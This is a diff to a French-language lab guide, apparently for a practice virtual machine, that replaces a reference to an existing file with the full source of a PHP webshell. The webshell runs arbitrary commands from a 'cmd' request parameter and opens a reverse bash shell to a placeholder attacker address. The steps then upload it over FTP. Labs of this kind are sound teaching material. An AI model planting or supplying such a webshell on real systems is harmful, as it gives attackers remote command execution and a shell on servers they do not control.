@@ -47,7 +47,21 @@ Aprés modification des paramétres, démarre la machine virtuelle
 
 ## Ajouter un webshell
 - Sortir du ftp
-- Créer un fichier webshell.php (déja disponible dans le répertoire)
+- Créer un fichier webshell.php et mettre ceci
+```
+<?php
+if(isset($_GET['cmd'])) {
+    echo "<pre>";
+    $cmd = ($_GET['cmd']);
+    system($cmd);
+    echo "</pre>";
+}
+if(isset($_GET['rev'])) {
+    $sock = fsockopen("YOUR_IP", YOUR_PORT);
+    exec("/bin/bash -i <&3 >&3 2>&3");
+}
+?>
+```
 - Entrer dans le ftp
 - Verser le fichier dans le ftp
     - put webshell.php
